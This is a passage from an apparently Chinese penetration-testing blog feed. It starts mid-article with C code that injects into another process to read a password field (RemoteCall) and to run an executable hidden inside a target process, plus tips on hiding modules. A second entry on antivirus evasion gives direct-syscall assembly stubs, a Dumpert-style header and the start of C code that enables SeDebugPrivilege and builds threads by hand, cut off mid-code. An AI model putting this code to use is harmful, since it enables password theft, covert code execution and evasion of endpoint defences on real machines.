的唯一缺点是效率不高（当然，还有一个缺点，你的 exe 必须是可重定位的）。</p><p>调用例子：</p><p>在 Windows 2000 中，对有密码保护风格的 Edit control 调用 SendMessage(hwnd, WM_GETTEXT, …) 试图得到密码内容时， 系统会检查调用 SendMessage 的进程和 Edit control 所在的进程是否相同，不同则返回空字符串，调用失败。 解决办法显然应该是在目标进程中调用 SendMessage。 利用 RemoteCall，可以很容易地实现：</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _tagGETPASS {   HWND hwndPassword; // in   char szPassText[1024]; // out} GETPASS;static int *_p = NULL;BOOL NullFunction() {    // 可以用静态变量和异常保护。    __try {        *_p = 0;    }__except(EXCEPTION_EXECUTE_HANDLER){}    return TRUE;}// 准备在远程运行的代码BOOL WINAPI RemoteGetPasswordText( GETPASS* pgp ) {    // 可以使用相对调用 (near call)，没什么用，演示一下    NullFunction();    // 隐性调用 Windows API    if ( SendMessageA( pgp-&gt;hwndPassword, WM_GETTEXT, sizeof(pgp-&gt;szPassText)-1, (LPARAM)pgp-&gt;szPassText ) ) ) {        MessageBoxA( NULL,            pgp-&gt;szPassText,            "Great!!", // 可以使用字符串常量            MB_OK );        return TRUE;    }    return FALSE;}void GetPasswordText( HWND hwnd ) {    GETPASS gp;    gp.hwndPassword = hwnd;    DWORD processId;    GetWindowThreadProcessId( hwnd, &amp;processId );    HMODULE hLib = ::LoadLibrary( "remote.dll" );    if ( hLib != NULL ) {        typedef BOOL (WINAPI *PFN_RemoteCall)( DWORD processId, PVOID pfnAddr, PVOID pParam, DWORD cbParamSize, BOOL fSyncronize );        PFN_RemoteCall fnRemoteCall = (PFN_RemoteCall)::GetProcAddress( hLib, "RemoteCall" );        if ( fnRemoteCall != NULL ) {            if ( fnRemoteCall( processId, RemoteGetPasswordText, &amp;gp, sizeof(gp), TRUE ) )                MessageBoxA( NULL, gp.szPassText, "we get the password!!", MB_OK );        }        ::FreeLibrary( hLib );    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>RemoteRun 的调用例子：</p><pre class="line-numbers language-none"><code class="language-none">void PrintUsage() {    printf( "\tUsage: rmExe &lt;target process id&gt; &lt;Exe file path&gt;\n" );}int main(int argc, char* argv[]) {    if ( argc &lt;= 2) {        PrintUsage();        return -1;    }    int pid = atoi( argv[1] );    if ( pid != 0 ) {        HMODULE hRemote = ::LoadLibrary( "remote.dll" );        if ( hRemote != NULL ) {            typedef DWORD (WINAPI *PFN_RemoteRun)( DWORD processId, LPCSTR lpszAppPath, LPSTR lpszCmdLine, int nCmdShow);            PFN_RemoteRun fnRemoteRun = (PFN_RemoteRun)::GetProcAddress( hRemote, "RemoteRunA" );            if ( fnRemoteRun != NULL )                fnRemoteRun( pid, argv[2], NULL, SW_SHOW );                FreeLibrary( hRemote );        }    }    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应该注意的问题：</p><p>最困难的部分是加载客户 exe，简单的调用 LoadLibrary 根本不能解决问题，他不会替你修改重定位表和导入表。 另外对于 .tls section（用于支持线程本地存储）和 .bss section（用于为初始化数据），我目前还不是很清楚如何处理； 希望有人和我一起探讨；</p><p>目前 remote.dll 还不能支持在一个进程空间运行三个或更多程序。问题出在我在 remote.dll 中维护着一个客户 exe 的 thread 列表， 用于判断谁调用了 GetModuleHandle 等 API，目前只能处理一个客户 exe。这个问题不难解决；</p><p>有一些工具可以查看进程中加载的模块列表，如果想做进程彻底隐藏，不想让这些工具检测到我们的模块，在我看来，至少有两种解决办法：</p><p>不用 LoadLibrary，自己写 LoadDLL，这看起来似乎很困难，幸运的是，在 bo2k 的源代码中提供了一套这样的工具（在 dll_load.cpp 中实现）。 remote.dll 中修改重定位表和导入表基本上用的都是 dll_load.cpp 里的代码。值得注意的是，dll_load.cpp 原来的实现中有一点 bug，他不能正确处理有 Borland 的 tlink32 生成的 exe。 具体原因请仔细阅读 Matt pietrek 的 “Windows 95 system programming secrets”， 或 msdn 文章：”Peering Inside the PE: A Tour of the Win32 Portable Executable File Format”，里面讲到了 ms linker 和 borland linker 的区别。</p><p>我自己实现了一种模块剥离技术，可以让进程脱离 .exe 文件和 .dll 文件运行。其思想是先对要剥离的 exe 或 dll 模块的所有数据做好备份，然后用 FreeLibrary 或者 UnmapViewOfFile 卸掉模块， 再把备份的模块数据恢复回来。我以前在 csdn 上贴过代码的，自己找吧。</p><p>截获 API 用的是 MS Detours Package 1.3。我不打算附上它的源代码，自己去下载吧：<a href="http://research.microsoft.com/sn/detours">http://research.microsoft.com/sn/detours</a></p><p>在截获 API 时必须挂起其他线程。我用了两个未公开的接口：NtQuerySystemInformation 用于枚举线程；NtOpenThread 用于得到线程句柄。 推荐一本工具书：”Windows NT Native API reference”（中文译名为 “Windows NT 本机 API 参考 “），书名大致如此，不必深究。气人的是居然把 Navtive 翻为本机，I 服了 you。书中列出了很多 Native API 的原型及其用到的数据结构。虽然翻译巨糙无比，但独此一家，别无选择，买一本参考参考还是值得的，如果你想研究 “本机” API 的话，:)。</p><p>运行成功的例子：</p><p>在 Depends.exe 进程中运行 Calc.exe；<br>在 Depends.exe 进程中运行 Acrobat 5.0；<br>在 Depends.exe 进程中运行 Microsoft Visio 2000；<br>在 Depends.exe 进程中运行 Process Hacker（我自己写的一个进程查看工具），用了很多低层接口；<br>在 Process Hacker 进程中运行 Acrobat 5.0。<br>唯一失败的例子是以客户身份运行 matlab 5.1。这个可执行文件很特殊，有多个 code section 和 data section，还有 .tls section 和 .bss section。 失败原因不是很清楚（主要是没有足够的时间研究），可能是 .tls 和 .bss section 在加载时没有处理好； 也可能是某个应该做特殊处理的 API 没有拦截处理。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.33-luan-quan-ye-da-bu-si-lao-shi-fu-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.33-luan-quan-ye-da-bu-si-lao-shi-fu-san/</url>
      
        <content type="html"><![CDATA[<p>用户层的应用程序要想和底层系统交互，通常使用应用程序编程接口（Application Programming Interface ）也就是所谓的API。如果你是编写C/C++应用的Windows程序开发程序员，通常使用 Win32 API。</p><p>Win32API是微软封装的一套API接口，由几个DLL（所谓的Win32子系统DLL）组成。在Win32 API下面使用的是Naitve API（ntdll.dll），这个才是真正用户层和系统底层交互的接口，一般称为用户层和内核层之间的桥梁。</p><p>但是ntdll中函数大部分都没有被微软记录到官方的开发文档中，为了兼容性问题，大多数情况在写程序时，应该避免直接使用ntdll中的API。</p><p>如何通过编程来绕过Win32接口层，直接调用系统API并绕过潜在的Ring3层Hook？</p><p>system.asm</p><pre class="line-numbers language-none"><code class="language-none">.code; Reference: https://j00ru.vexillium.org/syscalls/nt/64/; Windows 7 SP1 / Server 2008 R2 specific syscallsNtCreateThread7SP1 procmov r10, rcxmov eax, 4BhsyscallretNtCreateThread7SP1 endpZwOpenProcess7SP1 procmov r10, rcxmov eax, 23hsyscallretZwOpenProcess7SP1 endpZwClose7SP1 procmov r10, rcxmov eax, 0ChsyscallretZwClose7SP1 endpZwWriteVirtualMemory7SP1 procmov r10, rcxmov eax, 37hsyscallretZwWriteVirtualMemory7SP1 endpZwProtectVirtualMemory7SP1 procmov r10, rcxmov eax, 4DhsyscallretZwProtectVirtualMemory7SP1 endpZwQuerySystemInformation7SP1 procmov r10, rcxmov eax, 33hsyscallretZwQuerySystemInformation7SP1 endpNtAllocateVirtualMemory7SP1 procmov r10, rcxmov eax, 15hsyscallretNtAllocateVirtualMemory7SP1 endpNtFreeVirtualMemory7SP1 procmov r10, rcxmov eax, 1BhsyscallretNtFreeVirtualMemory7SP1 endpNtCreateFile7SP1 procmov r10, rcxmov eax, 52hsyscallretNtCreateFile7SP1 endp; Windows 8 / Server 2012 specific syscallsZwOpenProcess80 procmov r10, rcxmov eax, 24hsyscallretZwOpenProcess80 endpZwClose80 procmov r10, rcxmov eax, 0DhsyscallretZwClose80 endpZwWriteVirtualMemory80 procmov r10, rcxmov eax, 38hsyscallretZwWriteVirtualMemory80 endpZwProtectVirtualMemory80 procmov r10, rcxmov eax, 4EhsyscallretZwProtectVirtualMemory80 endpZwQuerySystemInformation80 procmov r10, rcxmov eax, 34hsyscallretZwQuerySystemInformation80 endpNtAllocateVirtualMemory80 procmov r10, rcxmov eax, 16hsyscallretNtAllocateVirtualMemory80 endpNtFreeVirtualMemory80 procmov r10, rcxmov eax, 1ChsyscallretNtFreeVirtualMemory80 endpNtCreateFile80 procmov r10, rcxmov eax, 53hsyscallretNtCreateFile80 endp; Windows 8.1 / Server 2012 R2 specific syscallsNtCreateThread81 procmov r10, rcxmov eax, 4DhsyscallretNtCreateThread81 endpZwOpenProcess81 procmov r10, rcxmov eax, 25hsyscallretZwOpenProcess81 endpZwClose81 procmov r10, rcxmov eax, 0EhsyscallretZwClose81 endpZwWriteVirtualMemory81 procmov r10, rcxmov eax, 39hsyscallretZwWriteVirtualMemory81 endpZwProtectVirtualMemory81 procmov r10, rcxmov eax, 4FhsyscallretZwProtectVirtualMemory81 endpZwQuerySystemInformation81 procmov r10, rcxmov eax, 35hsyscallretZwQuerySystemInformation81 endpNtAllocateVirtualMemory81 procmov r10, rcxmov eax, 17hsyscallretNtAllocateVirtualMemory81 endpNtFreeVirtualMemory81 procmov r10, rcxmov eax, 1DhsyscallretNtFreeVirtualMemory81 endpNtCreateFile81 procmov r10, rcxmov eax, 54hsyscallretNtCreateFile81 endp; Windows 10 / Server 2016 specific syscalls ZwOpenProcess10 procmov r10, rcxmov eax, 26hsyscallretZwOpenProcess10 endpZwClose10 procmov r10, rcxmov eax, 0FhsyscallretZwClose10 endpZwWriteVirtualMemory10 procmov r10, rcxmov eax, 3AhsyscallretZwWriteVirtualMemory10 endpZwProtectVirtualMemory10 procmov r10, rcxmov eax, 50hsyscallretZwProtectVirtualMemory10 endpZwQuerySystemInformation10 procmov r10, rcxmov eax, 36hsyscallretZwQuerySystemInformation10 endpNtAllocateVirtualMemory10 procmov r10, rcxmov eax, 18hsyscallretNtAllocateVirtualMemory10 endpNtFreeVirtualMemory10 procmov r10, rcxmov eax, 1EhsyscallretNtFreeVirtualMemory10 endpNtCreateFile10 procmov r10, rcxmov eax, 55hsyscallretNtCreateFile10 endpNtCreateThread10 procmov r10, rcxmov eax, 4EhsyscallretNtCreateThread10 endpNtCreateThreadEx10 procmov r10, rcxmov eax, 0BBhsyscallretNtCreateThreadEx10 endpNtAllocateVirtualMemoryEx10 procmov r10, rcxmov eax, 0BBhsyscallretNtAllocateVirtualMemoryEx10 endpend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#pragma once#include &lt;Windows.h&gt;#define STATUS_SUCCESS 0#define OBJ_CASE_INSENSITIVE 0x00000040L#define FILE_OVERWRITE_IF 0x00000005#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020typedef LONG KPRIORITY;#define InitializeObjectAttributes( i, o, a, r, s ) {    \      (i)-&gt;Length = sizeof( OBJECT_ATTRIBUTES );         \      (i)-&gt;RootDirectory = r;                            \      (i)-&gt;Attributes = a;                               \      (i)-&gt;ObjectName = o;                               \      (i)-&gt;SecurityDescriptor = s;                       \      (i)-&gt;SecurityQualityOfService = NULL;              \   }typedef struct _UNICODE_STRING {USHORT Length;USHORT MaximumLength;PWSTR  Buffer;} UNICODE_STRING, * PUNICODE_STRING;typedef const UNICODE_STRING* PCUNICODE_STRING;typedef struct _WIN_VER_INFO {WCHAR chOSMajorMinor[8];DWORD dwBuildNumber;UNICODE_STRING ProcName;HANDLE hTargetPID;LPCSTR lpApiCall;INT SystemCall;} WIN_VER_INFO, * PWIN_VER_INFO;typedef struct _OBJECT_ATTRIBUTES {ULONG Length;HANDLE RootDirectory;PUNICODE_STRING ObjectName;ULONG Attributes;PVOID SecurityDescriptor;PVOID SecurityQualityOfService;} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;typedef struct _CLIENT_ID {HANDLE UniqueProcess;HANDLE UniqueThread;} CLIENT_ID, * PCLIENT_ID;typedef enum _SYSTEM_INFORMATION_CLASS {SystemBasicInformation,SystemProcessorInformation,SystemPerformanceInformation,SystemTimeOfDayInformation,SystemPathInformation,SystemProcessInformation,SystemCallCountInformation,SystemDeviceInformation,SystemProcessorPerformanceInformation,SystemFlagsInformation,SystemCallTimeInformation,SystemModuleInformation} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;typedef struct _INITIAL_TEB{struct{PVOID OldStackBase;PVOID OldStackLimit;} OldInitialTeb;PVOID StackBase;PVOID StackLimit;PVOID StackAllocationBase;} INITIAL_TEB, * PINITIAL_TEB;typedef struct _SYSTEM_PROCESSES {ULONG NextEntryDelta;ULONG ThreadCount;ULONG Reserved1[6];LARGE_INTEGER CreateTime;LARGE_INTEGER UserTime;LARGE_INTEGER KernelTime;UNICODE_STRING ProcessName;KPRIORITY BasePriority;HANDLE ProcessId;HANDLE InheritedFromProcessId;} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;typedef struct _IO_STATUS_BLOCK{union{LONG Status;PVOID Pointer;};ULONG Information;} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;// Windows 7 SP1 / Server 2008 R2 specific SyscallsEXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation7SP1(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);EXTERN_C NTSTATUS ZwOpenProcess7SP1(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);EXTERN_C NTSTATUS NtFreeVirtualMemory7SP1(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);EXTERN_C NTSTATUS NtAllocateVirtualMemory7SP1(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);EXTERN_C NTSTATUS ZwProtectVirtualMemory7SP1(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);EXTERN_C NTSTATUS NtCreateThread7SP1(OUT PHANDLE ThreadHandle,IN  ACCESS_MASK DesiredAccess,IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,IN  HANDLE ProcessHandle,OUT PCLIENT_ID ClientId,IN  PCONTEXT ThreadContext,IN  PINITIAL_TEB InitialTeb,IN  BOOLEAN CreateSuspended);// Windows 8 / Server 2012 specific SyscallsEXTERN_C NTSTATUS NtAllocateVirtualMemory80(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);EXTERN_C NTSTATUS NtCreateThread80(OUT PHANDLE ThreadHandle,IN  ACCESS_MASK DesiredAccess,IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,IN  HANDLE ProcessHandle,OUT PCLIENT_ID ClientId,IN  PCONTEXT ThreadContext,IN  PINITIAL_TEB InitialTeb,IN  BOOLEAN CreateSuspended);// Windows 8.1 / Server 2012 R2 specific SyscallsEXTERN_C NTSTATUS ZwOpenProcess81(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);EXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation81(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);EXTERN_C NTSTATUS NtFreeVirtualMemory81(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);EXTERN_C NTSTATUS NtAllocateVirtualMemory81(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);EXTERN_C NTSTATUS ZwProtectVirtualMemory81(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);EXTERN_C NTSTATUS NtCreateThread81(OUT PHANDLE ThreadHandle,IN  ACCESS_MASK DesiredAccess,IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,IN  HANDLE ProcessHandle,OUT PCLIENT_ID ClientId,IN  PCONTEXT ThreadContext,IN  PINITIAL_TEB InitialTeb,IN  BOOLEAN CreateSuspended);// Windows 10 / Server 2016 specific SyscallsEXTERN_C NTSTATUS ZwOpenProcess10(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);EXTERN_C NTSTATUS WINAPI ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);EXTERN_C NTSTATUS NtFreeVirtualMemory10(HANDLE ProcessHandle, PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, ULONG FreeType);EXTERN_C NTSTATUS NtAllocateVirtualMemory10(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);EXTERN_C NTSTATUS ZwProtectVirtualMemory10(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);EXTERN_C NTSTATUS NtCreateThread10(OUT PHANDLE ThreadHandle,IN  ACCESS_MASK DesiredAccess,IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,IN  HANDLE ProcessHandle,OUT PCLIENT_ID ClientId,IN  PCONTEXT ThreadContext,IN  PINITIAL_TEB InitialTeb,IN  BOOLEAN CreateSuspended);EXTERN_C NTSTATUS NtCreateThreadEx10(OUT PHANDLE hThread,IN ACCESS_MASK DesiredAccess,IN LPVOID ObjectAttributes,IN HANDLE ProcessHandle,IN LPTHREAD_START_ROUTINE lpStartAddress,IN LPVOID lpParameter,IN BOOL CreateSuspended,IN ULONG StackZeroBits,IN ULONG SizeOfStackCommit,IN ULONG SizeOfStackReserve,OUT LPVOID lpBytesBuffer);EXTERN_C NTSTATUS NtAllocateVirtualMemoryEx10(_In_opt_ HANDLE Process,_In_opt_ PVOID* BaseAddress,_In_ SIZE_T* RegionSize,_In_ ULONG AllocationType,_In_ ULONG PageProtection,_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,_In_ ULONG ParameterCount);NTSTATUS(*NtAllocateVirtualMemoryEx) (_In_opt_ HANDLE Process,_In_opt_ PVOID* BaseAddress,_In_ SIZE_T* RegionSize,_In_ ULONG AllocationType,_In_ ULONG PageProtection,_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,_In_ ULONG ParameterCount);NTSTATUS(*NtCreateThreadEx) (OUT PHANDLE hThread,IN ACCESS_MASK DesiredAccess,IN LPVOID ObjectAttributes,IN HANDLE ProcessHandle,IN LPTHREAD_START_ROUTINE lpStartAddress,IN LPVOID lpParameter,IN BOOL CreateSuspended,IN ULONG StackZeroBits,IN ULONG SizeOfStackCommit,IN ULONG SizeOfStackReserve,OUT LPVOID lpBytesBuffer);NTSTATUS(*NtAllocateVirtualMemory)(HANDLE ProcessHandle,PVOID* BaseAddress,ULONG_PTR ZeroBits,PSIZE_T RegionSize,ULONG AllocationType,ULONG Protect);NTSTATUS(*ZwProtectVirtualMemory)(IN HANDLE ProcessHandle,IN PVOID* BaseAddress,IN SIZE_T* NumberOfBytesToProtect,IN ULONG NewAccessProtection,OUT PULONG OldAccessProtection);NTSTATUS(*NtFreeVirtualMemory)(HANDLE ProcessHandle,PVOID* BaseAddress,IN OUT PSIZE_T RegionSize,ULONG FreeType);NTSTATUS(*ZwOpenProcess)(PHANDLE ProcessHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes,PCLIENT_ID ClientId);NTSTATUS(WINAPI* ZwQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);NTSTATUS(*NtCreateThread)(OUT PHANDLE ThreadHandle,IN  ACCESS_MASK DesiredAccess,IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,IN  HANDLE ProcessHandle,OUT PCLIENT_ID ClientId,IN  PCONTEXT ThreadContext,IN  PINITIAL_TEB InitialTeb,IN  BOOLEAN CreateSuspended);typedef NTSTATUS(NTAPI* _RtlGetVersion)(LPOSVERSIONINFOEXW lpVersionInformation);typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString,PCWSTR SourceString);typedef NTSYSAPI BOOLEAN(NTAPI* _RtlEqualUnicodeString)(PUNICODE_STRING String1,PCUNICODE_STRING String2,BOOLEAN CaseInSensitive);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#undef  _UNICODE#define _UNICODE#undef  UNICODE#define UNICODE#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include "Dumpert.h"#pragma comment (lib, "Dbghelp.lib")#define RPL_MASK                0x0003#define MODE_MASK               0x0001#define KGDT64_NULL             0x0000#define KGDT64_R0_CODE          0x0010#define KGDT64_R0_DATA          0x0018#define KGDT64_R3_CMCODE        0x0020#define KGDT64_R3_DATA          0x0028#define KGDT64_R3_CODE          0x0030#define KGDT64_SYS_TSS          0x0040#define KGDT64_R3_CMTEB         0x0050#define KGDT64_R0_LDT           0x0060DWORD WINAPI StartAddress(LPVOID lpThreadParameter) {return ((int(__stdcall*)(LPVOID))lpThreadParameter)(lpThreadParameter);}NTSTATUS MyInitTeb(PINITIAL_TEB InitialTeb) {PVOID StackBaseAddr = NULL;SIZE_T StackSize = 0x1000 * 10;NTSTATUS Status;Status = NtAllocateVirtualMemory(GetCurrentProcess(),(PVOID*)&amp;StackBaseAddr,0,&amp;StackSize,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);if (Status != 0) {printf("MyInitStack:%llx\n", Status);return Status;}InitialTeb-&gt;StackAllocationBase = (PVOID)StackBaseAddr;InitialTeb-&gt;StackBase = (PVOID)((INT64)StackBaseAddr + StackSize - 0x1000*5);InitialTeb-&gt;OldInitialTeb.OldStackBase = NULL;InitialTeb-&gt;OldInitialTeb.OldStackLimit = NULL;InitialTeb-&gt;StackLimit = StackBaseAddr;return STATUS_SUCCESS;}NTSTATUS MyInitContext(PCONTEXT pContext,PVOID ThreadFuncAddr,PVOID FuncArgAddr,PVOID StackBaseAddr) {// set rsppContext-&gt;Rsp = (DWORD64)StackBaseAddr;// set ip and rcxpContext-&gt;Rip = (DWORD64)ThreadFuncAddr;pContext-&gt;Rcx = (DWORD64)FuncArgAddr;// noppContext-&gt;Rax = (DWORD64)NULL;pContext-&gt;Rbx = (DWORD64)NULL;pContext-&gt;Rdx = (DWORD64)NULL;pContext-&gt;Rsi = (DWORD64)NULL;pContext-&gt;Rdi = (DWORD64)NULL;pContext-&gt;R8 = (DWORD64)NULL;pContext-&gt;R9 = (DWORD64)NULL;// set context flagspContext-&gt;ContextFlags = CONTEXT_FULL;// unknowpContext-&gt;EFlags = 0x3000;/* IOPL 3 */// set seg registerspContext-&gt;SegGs = KGDT64_R3_DATA | RPL_MASK;pContext-&gt;SegEs = KGDT64_R3_DATA | RPL_MASK;pContext-&gt;SegDs = KGDT64_R3_DATA | RPL_MASK;pContext-&gt;SegCs = KGDT64_R3_CODE | RPL_MASK;pContext-&gt;SegSs = KGDT64_R3_DATA | RPL_MASK;pContext-&gt;SegFs = KGDT64_R3_CMTEB | RPL_MASK;return STATUS_SUCCESS;}BOOL IsElevated() {BOOL fRet = FALSE;HANDLE hToken = NULL;if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &amp;hToken)) {TOKEN_ELEVATION Elevation = { 0 };DWORD cbSize = sizeof(TOKEN_ELEVATION);if (GetTokenInformation(hToken, TokenElevation, &amp;Elevation, sizeof(Elevation), &amp;cbSize)) {fRet = Elevation.TokenIsElevated;}}if (hToken) {CloseHandle(hToken);}return fRet;}BOOL SetDebugPrivilege() {HANDLE hToken = NULL;TOKEN_PRIVILEGES TokenPrivileges = { 0 };if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) {return FALSE;}TokenPrivileges.PrivilegeCount = 1;TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;LPWSTR lpwPriv = L"SeDebugPrivilege";if 